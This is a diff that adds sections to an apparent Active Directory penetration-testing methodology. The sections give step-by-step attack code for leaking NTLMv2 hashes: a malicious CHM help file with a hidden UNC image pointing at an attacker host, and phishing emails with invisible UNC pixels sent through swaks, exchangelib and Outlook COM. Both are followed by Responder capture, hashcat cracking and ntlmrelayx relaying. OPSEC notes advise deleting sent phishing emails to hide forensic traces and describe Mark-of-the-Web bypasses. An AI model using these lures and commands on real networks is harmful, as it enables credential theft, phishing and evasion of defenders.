 > **OPSEC:** SCF is flagged by modern EDR signature sets; `.url` and `desktop.ini` blend with normal share content but produce outbound SMB from workstations to non-DC IPs (high-fidelity IOC). Pair with internal-pivot listener if egress is monitored. Service accounts running scheduled scans through file shares (backup agents, AV, indexers) are the highest-value catches — they often have machine-account or privileged context.
 
+### 11.7b Malicious CHM (Compiled HTML Help) with UNC Image for Hash Leak
+
+A `.chm` file containing an HTML page with an embedded UNC `<img>` tag triggers NTLM authentication when the victim opens the help file. Unlike `.scf`/`.url`/`desktop.ini` (which fire on folder browse), CHM requires a double-click — but CHM files are commonly shared in internal documentation repositories, SharePoint, and helpdesk portals where users trust them.
+
+**Build the malicious CHM:**
+```bash
+# 1. Create the HTML source file with UNC image reference
+mkdir -p /tmp/chm_project
+cat > /tmp/chm_project/index.html <<'EOF'
+<html>
+<head><title>IT Documentation</title></head>
+<body>
+<h1>Network Configuration Guide</h1>
+<p>Please refer to the diagram below:</p>
+<img src="\\<ATTACKER_IP>\share\diagram.png" width="1" height="1">
+<p>Contact the IT helpdesk for questions.</p>
+</body>
+</html>
+EOF
+
+# 2. Create the HHP (HTML Help Project) file
+cat > /tmp/chm_project/project.hhp <<'EOF'
+[OPTIONS]
+Compatibility=1.1
+Compiled file=documentation.chm
+Default topic=index.html
+Display compile progress=No
+Language=0x409 English (United States)
+
+[FILES]
+index.html
+EOF
+
+# 3. Compile with hhc.exe (Windows HTML Help Compiler — on any Windows box)
+# Or use the free-wine approach from Linux:
+# Wine path: wine "C:\\Program Files\\HTML Help Workshop\\hhc.exe" project.hhp
+# Note: hhc.exe returns exit code 1 on success (quirk)
+```
+
+```powershell
+# From a Windows pivot — compile the CHM natively
+# HTML Help Workshop must be installed (free Microsoft download, commonly on dev boxes)
+& "C:\Program Files (x86)\HTML Help Workshop\hhc.exe" C:\temp\project.hhp
+# Output: C:\temp\documentation.chm
+```
+
+```bash
+# 4. Alternative: use nishang Out-CHM (PowerShell — generates CHM with embedded payload)
+# Out-CHM creates a CHM that runs arbitrary commands, but for hash-only capture
+# we just need the UNC img tag in the HTML source
+
+# 5. Drop the CHM on a writable share / email it / upload to SharePoint
+smbclient '//<TARGET>/<SHARE>' -U '<DOMAIN>/<USER>%<PASSWORD>' \
+    -c 'put /tmp/chm_project/documentation.chm documentation.chm'
+```
+
+**Capture the hash:**
+```bash
+# Start Responder (or impacket-smbserver) and wait for victim to open the CHM
+sudo responder -I <INTERFACE> -wv
+
+# When victim double-clicks the .chm, hh.exe renders the HTML internally
+# and the <img src="\\ATTACKER\..."> triggers SMB auth → NTLMv2 hash captured
+
+# Crack
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Build and compile CHM entirely from a Windows foothold (no tool upload)
+$html = @'
+<html><body><img src="\\<ATTACKER_IP>\share\x.png" width="1" height="1">
+<h1>Updated Procedures</h1></body></html>
+'@
+$html | Out-File -Encoding ascii C:\temp\index.html
+
+$hhp = @'
+[OPTIONS]
+Compiled file=guide.chm
+Default topic=index.html
+[FILES]
+index.html
+'@
+$hhp | Out-File -Encoding ascii C:\temp\project.hhp
+
+# Compile (hhc.exe path varies — check Program Files and x86)
+& "${env:ProgramFiles(x86)}\HTML Help Workshop\hhc.exe" C:\temp\project.hhp
+# If HTML Help Workshop not installed, the CHM source HTML alone can be shared
+# as an .htm file with the same UNC img — but CHM has higher open-rate trust
+```
+
+> **CHM vs other lure types:** CHM files bypass Mark-of-the-Web (MOTW) in some configurations because `hh.exe` (the CHM viewer) does not honor zone identifiers the same way Explorer does. On modern Windows 11 with Smart App Control, CHM from external sources may still be blocked — but internal share drops bypass this entirely since the file never carries MOTW.
+
 > **When the standard chain (Phases 1-11) does not yield DA, check Phase 12 (Exchange), Phase 13 (SCCM/MECM), and Phase 14 (WSUS) for alternate paths to domain compromise.**
 
 [↑ Back to top](#active-directory-penetration-testing-methodology)
@@ -3098,6 +3730,111 @@ Invoke-SelfSearch -Mailbox <USER>@<DOMAIN> -ExchHostname <EXCHANGE_IP> -Terms "p
 # Search other mailboxes (requires Exchange admin or ApplicationImpersonation role):
 Invoke-GlobalMailSearch -ImpersonationAccount <EXCHANGE_ADMIN> -ExchHostname <EXCHANGE_IP> -Terms "password"
 ```
+
+### 12.2b OWA Spear-Phishing for Net-NTLMv2 Hash Capture
+
+After gaining OWA/EWS access with valid credentials, send HTML emails containing embedded UNC paths or external image references to domain users. When the victim's mail client (Outlook desktop) renders the email, it automatically attempts NTLM authentication against the attacker's listener — leaking Net-NTLMv2 hashes without any click required.
+
+**Enumerate targets — Global Address List (GAL) harvesting:**
+```bash
+# MailSniper — dump the GAL via EWS/OWA
+Import-Module .\MailSniper.ps1
+Get-GlobalAddressList -ExchHostname <EXCHANGE_IP> -UserName '<USER>@<DOMAIN>' -Password '<PASSWORD>' -OutFile gal.txt
+
+# Or via OWA manually: People → All Users → export
+
+# From Linux — impacket EWS query for GAL (requires Exchange Web Services endpoint)
+# Alternative: use ruler to enumerate contacts
+ruler -k --domain <DOMAIN> --url https://<EXCHANGE_IP>/autodiscover/autodiscover.xml \
+    --username '<USER>' --password '<PASSWORD>' display
+```
+
+**Craft and send the phishing email:**
+```bash
+# Method 1: swaks (Swiss Army Knife for SMTP) — send HTML email with embedded UNC img
+swaks --to '<VICTIM>@<DOMAIN>' \
+    --from '<USER>@<DOMAIN>' \
+    --server <EXCHANGE_IP> \
+    --port 587 --tls \
+    --auth LOGIN --auth-user '<USER>@<DOMAIN>' --auth-password '<PASSWORD>' \
+    --header 'Content-Type: text/html' \
+    --body '<html><body>Please review the attached document.<img src="file://<ATTACKER_IP>/share/image.png" width="1" height="1"></body></html>' \
+    --header 'Subject: Q3 Budget Review - Action Required'
+
+# Method 2: UNC path via \\server\share format (triggers SMB auth)
+swaks --to '<VICTIM>@<DOMAIN>' \
+    --from '<USER>@<DOMAIN>' \
+    --server <EXCHANGE_IP> \
+    --port 587 --tls \
+    --auth LOGIN --auth-user '<USER>@<DOMAIN>' --auth-password '<PASSWORD>' \
+    --header 'Content-Type: text/html' \
+    --body '<html><body><img src="\\\\<ATTACKER_IP>\\share\\logo.png" width="1" height="1"><p>Updated org chart attached.</p></body></html>' \
+    --header 'Subject: Updated Org Chart'
+```
+
+```python3
+# Method 3: Python + exchangelib (more control over EWS)
+from exchangelib import Credentials, Account, Message, HTMLBody, Configuration, DELEGATE
+
+creds = Credentials('<USER>@<DOMAIN>', '<PASSWORD>')
+config = Configuration(server='<EXCHANGE_IP>', credentials=creds)
+account = Account('<USER>@<DOMAIN>', config=config, autodiscover=False, access_type=DELEGATE)
+
+html = '''<html><body>
+<p>Please review the shared folder:</p>
+<img src="file://<ATTACKER_IP>/share/tracking.png" width="1" height="1">
+</body></html>'''
+
+msg = Message(
+    account=account,
+    subject='Shared Folder Access - IT Department',
+    body=HTMLBody(html),
+    to_recipients=['<VICTIM>@<DOMAIN>']
+)
+msg.send()
+```
+
+**Capture the hashes:**
+```bash
+# Start Responder on the interface facing the target network
+sudo responder -I <INTERFACE> -wv
+
+# Or use impacket-smbserver for SMB-only capture
+impacket-smbserver share /tmp -smb2support
+
+# Hashes appear when victim's Outlook renders the email:
+# [SMB] NTLMv2 Hash     : <VICTIM>::<DOMAIN>:<CHALLENGE>:<RESPONSE>:<BLOB>
+
+# Crack offline
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or relay in real-time (disable SMB in Responder.conf first)
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# From a Windows foothold with OWA access — send via Outlook COM object (no swaks needed)
+$ol = New-Object -ComObject Outlook.Application
+$mail = $ol.CreateItem(0)
+$mail.To = '<VICTIM>@<DOMAIN>'
+$mail.Subject = 'Network Share Migration Notice'
+$mail.HTMLBody = '<html><body><p>Your home drive has been migrated.</p><img src="\\<ATTACKER_IP>\share\verify.png" width="1" height="1"></body></html>'
+$mail.Send()
+
+# Or via Send-MailMessage (PowerShell native — works against SMTP relay)
+Send-MailMessage -From '<USER>@<DOMAIN>' -To '<VICTIM>@<DOMAIN>' \
+    -Subject 'IT Notice' \
+    -Body '<html><body><img src="\\<ATTACKER_IP>\share\x.png"></body></html>' \
+    -BodyAsHtml \
+    -SmtpServer <EXCHANGE_IP> -Port 587 -UseSsl \
+    -Credential (New-Object PSCredential('<USER>@<DOMAIN>',(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force)))
+```
+
+> **Why this works:** Outlook desktop (not OWA web client) renders embedded images with UNC paths by auto-initiating SMB connections. Outlook on the Web (browser) does NOT trigger this — it proxies external images. Target users must have Outlook desktop installed. The 1x1 invisible pixel is the standard technique; no user click required.
+
+> **OPSEC:** Sent emails live in the Sent Items folder — delete them post-capture. The phishing email itself is the primary forensic artifact. Modern Exchange (2019+) with "External Sender" banners will flag the UNC path in some configurations.
 
 ### 12.3 PrivExchange — Relay Exchange HTTP to LDAP
 ```bash
